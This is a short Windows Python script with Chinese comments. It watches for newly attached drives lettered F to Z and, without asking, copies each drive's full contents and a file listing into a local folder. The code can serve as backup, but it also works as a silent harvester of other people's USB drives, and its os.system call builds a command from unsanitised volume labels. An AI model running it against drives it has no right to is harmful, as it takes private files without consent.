#!/usr/bin/env python3
# -*- coding: utf-8 -*-
__author__ = 'Lin Xin'

import re, os,shutil,threading,time

# 保存目录
save_path = 'D:\\python_project\\upan\\copy\\'






def copy_usb(disk_dict):
    for name,label in disk_dict.items():
        path=save_path+label
        try:
            os.mkdir(path)
        except FileExistsError:

            print('目录已存在')
            break

        # 文件目录拷贝
        os.system('dir '+ name +'/s /b > ' + path + '\\文件目录.txt')

        # 拷贝文件
        lock=threading.Lock()
        lock.acquire()
        try:
            copy_thread=threading.Thread(target=shutil.copytree,args=(name,path+'\\file\\'))
            copy_thread.start()
            copy_thread.join()
        finally:
            lock.release()

if __name__ == '__main__':
    disk_paths = re.compile(r'^[F-Z]:\\')
    while True:
        # U盘盘符与卷标
        disk_labels = os.popen("wmic VOLUME get label").readlines()
        disk_names = os.popen("wmic VOLUME get name").readlines()
        disk_dict={name.split(' ')[0]:label.split(' ')[0] for name,label in zip(disk_names,disk_labels) if re.match(disk_paths,name)}
        if len(disk_dict):
            copy_usb(disk_dict)
            time.sleep(60)
            break
        time.sleep(10)